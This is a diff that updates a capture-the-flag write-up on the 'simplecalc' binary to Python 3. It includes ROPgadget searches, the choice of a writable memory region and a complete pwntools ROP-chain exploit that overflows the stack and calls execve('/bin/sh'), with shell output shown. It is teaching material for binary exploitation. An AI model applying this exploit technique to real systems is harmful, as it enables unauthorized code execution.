@@ -263,7 +263,7 @@ rdx:  0x0               Specify no environment variables
 To do this, we will need gadgets to control those four register. I typically like to go with gadgets like `pop rax; ret`, since it makes it simple. We will also need a gadget to write the string `/bin/sh` somewhere in memory that we know. Let's find our gadgets using ROPGadget (checkout https://github.com/JonathanSalwan/ROPgadget ):
 
 ```
-$ python ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
+$ python3 ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
 0x000000000044db32 : add al, ch ; pop rax ; ret
 0x000000000040b032 : add al, ch ; pop rax ; retf 2
 0x000000000040b02f : add byte ptr [rax], 0 ; add al, ch ; pop rax ; retf 2
@@ -275,15 +275,15 @@ $ python ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
 0x000000000045d707 : pop rax ; retf
 0x000000000040b034 : pop rax ; retf 2
 0x0000000000474857 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
-$ python ROPgadget.py --binary simplecalc | grep "pop rdi ; ret"
+$ python3 ROPgadget.py --binary simplecalc | grep "pop rdi ; ret"
 0x000000000044bbbc : inc dword ptr [rbx - 0x7bf0fe40] ; pop rdi ; ret
 0x0000000000401b73 : pop rdi ; ret
-$ python ROPgadget.py --binary simplecalc | grep "pop rsi ; ret"
+$ python3 ROPgadget.py --binary simplecalc | grep "pop rsi ; ret"
 0x00000000004ac9b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rsi ; ret
 0x00000000004ac9b6 : add byte ptr [rax], al ; pop rsi ; ret
 0x0000000000437aa9 : pop rdx ; pop rsi ; ret
 0x0000000000401c87 : pop rsi ; ret
-$ python ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
+$ python3 ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
 0x00000000004a868c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdx ; ret 0x45
 0x00000000004a868e : add byte ptr [rax], al ; pop rdx ; ret 0x45
 0x00000000004afd61 : js 0x4afde1 ; pop rdx ; retf
@@ -300,7 +300,7 @@ $ python ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
 So we can see the gadgets for controlling the four registers are at `0x44db34`, `0x401b73`, `0x401c87`, and `0x437a85`. Now we need a gadget that will write an eight byte value to a memory region. For this I would like to start my search by searching through the gadgets with `mov` in them:
 
 ```
-$ python ROPgadget.py --binary simplecalc | grep "mov" | less
+$ python3 ROPgadget.py --binary simplecalc | grep "mov" | less
 ```
 
 after a bit of searching, we find this gadget:
@@ -312,7 +312,7 @@ after a bit of searching, we find this gadget:
 This gadget will move the four byte value from `rdx` to whatever memory is pointed to by `rax`. This is exactly what we need, and a bit convenient since we already have the gadgets for those two registers and this gadget doesn't do anything else that we need to worry about. The last gadget we need will be a `syscall` gadget:
 
 ```
-$ python ROPgadget.py --binary simplecalc | grep ": syscall"
+$ python3 ROPgadget.py --binary simplecalc | grep ": syscall"
 0x0000000000400488 : syscall
 ```
 
@@ -355,7 +355,7 @@ gef➤  x/20g 0x6c1000
 0x6c1090 <locale_alias_path.10061>: 0x000000000049462a  0x00000000006c32a0
 ```
 
-We see that the memory region that begins at `0x6c0000` and ends at `0x6c3000` looks like a good candidate. The permissions allow us to read and write to it. In addition to that it is mapped from the binary, and since there is no PIE the addresses will be the same every time (no infoleak needed). Looking a bit through the memory, `0x6c1000` looks like it's empty so we should be able to write to it without messing ip anything (although we could be wrong with that).
+We see that the memory region that begins at `0x6c0000` and ends at `0x6c3000` looks like a good candidate. The permissions allow us to read and write to it. In addition to that it is mapped from the binary, and since there is no PIE the addresses will be the same every time (no infoleak needed). Looking a bit through the memory, `0x6c1000` looks like it's empty so we should be able to write to it without messing up anything (although we could be wrong with that).
 
 The second thing we need to worry about deals with what we are overflowing on the stack.
 
@@ -402,8 +402,8 @@ from pwn import *
 target = process('./simplecalc')
 #gdb.attach(target, gdbscript = 'b *0x40154a')
 
-target.recvuntil('calculations: ')
-target.sendline('100')
+target.recvuntil(b'calculations: ')
+target.sendline(b'100')
 
 # Establish our rop gadgets
 popRax = 0x44db34
@@ -418,12 +418,12 @@ syscall = 0x400488
 
 # These two functions are what we will use to give input via addition
 def addSingle(x):
-  target.recvuntil("=> ")
-  target.sendline("1")
-  target.recvuntil("Integer x: ")
-  target.sendline("100")
-  target.recvuntil("Integer y: ")
-  target.sendline(str(x - 100))
+  target.recvuntil(b"=> ")
+  target.sendline(b"1")
+  target.recvuntil(b"Integer x: ")
+  target.sendline(b"100")
+  target.recvuntil(b"Integer y: ")
+  target.sendline(bytes(str(x - 100), encoding='utf-8'))
 
 
 def add(z):
@@ -433,7 +433,7 @@ def add(z):
   addSingle(y)
 
 # Fill up the space between the start of our input and the return address
-for i in xrange(9):
+for i in range(9):
   # Fill it up with null bytes, to make the ptr passed to free be a null pointer
   # So free doesn't crash
   add(0x0)
@@ -473,7 +473,7 @@ add(0x0)
 
 add(syscall) # Syscall instruction
 
-target.sendline('5') # Save and exit to execute memcpy and trigger buffer overflow
+target.sendline(b'5') # Save and exit to execute memcpy and trigger buffer overflow
 
 # Drop to an interactive shell to use our new shell
 target.interactive()
@@ -482,8 +482,8 @@ target.interactive()
 When we run the exploit:
 
 ```
-$ python exploit.py
-[+] Starting local process './simplecalc': pid 15676
+$ python3 exploit.py
+[+] Starting local process './simplecalc': pid 6507
 [*] Switching to interactive mode
 Result for x + y is 0.
 
@@ -494,11 +494,14 @@ Options Menu:
  [4] Division.
  [5] Save and Exit.
 => $ w
- 20:06:39 up  5:53,  1 user,  load average: 1.71, 1.30, 1.37
+ 18:59:54 up  2:49,  1 user,  load average: 0.31, 0.19, 0.11
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               14:13   ?xdm?  22:10   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
+guyinatu :0       :0               16:17   ?xdm?   6:14   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
 $ ls
-core  exploit.py  readme.md  simplecalc
+exploit.py  readme.md  simplecalc
+$
+[*] Interrupted
+[*] Stopped process './simplecalc' (pid 6507)
 ```
 
 Just like that, we popped a shell!
